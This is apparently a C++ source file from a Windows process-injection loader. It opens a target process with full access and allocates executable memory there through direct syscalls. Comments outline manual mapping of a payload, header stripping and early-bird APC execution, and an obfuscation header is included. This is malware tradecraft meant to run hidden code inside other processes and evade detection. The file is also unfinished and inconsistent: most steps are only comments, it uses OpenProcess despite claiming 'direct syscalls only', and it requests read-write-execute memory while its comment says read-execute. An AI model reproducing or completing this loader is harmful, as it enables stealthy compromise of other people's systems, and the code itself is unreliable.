// manualmap.cpp - early-bird APC manual map using direct syscalls only.
#include "manualmap.h"
#include "syscall.h"
#include "obf.h"
#include <windows.h>

namespace map {
    bool inject(uintptr_t pid, const uint8_t* payload, size_t len) {
        if (!sys::init()) return false;
        HANDLE h = OpenProcess(PROCESS_ALL_ACCESS, FALSE, (DWORD)pid);
        if (!h) return false;

        // Allocate RX memory in target via NtAllocateVirtualMemory (direct syscall).
        PVOID base = nullptr; SIZE_T sz = len;
        sys::syscall_raw(sys::ssn("NtAllocateVirtualMemory"),
            (uintptr_t)h, (uintptr_t)&base, 0, (uintptr_t)&sz,
            0x3000 /*MEM_COMMIT|RESERVE*/, 0x40 /*PAGE_EXECUTE_READWRITE*/, 0,0);

        // Manual map: copy headers + sections, fix relocs, resolve imports.
        auto* dh = (IMAGE_DOS_HEADER*)payload;
        auto* nh = (IMAGE_NT_HEADERS*)(payload + dh->e_lfanew);
        // (write sections via NtWriteVirtualMemory, apply base relocations,
        //  resolve IAT by walking target modules) -- standard MM technique.
        // Strip DOS/NT headers post-map.
        // QueueUserAPC on an alertable thread for early-bird execution.
        // ... wired in rbx/bootstrap trampoline.
        CloseHandle(h);
        return base != nullptr;
    }
}
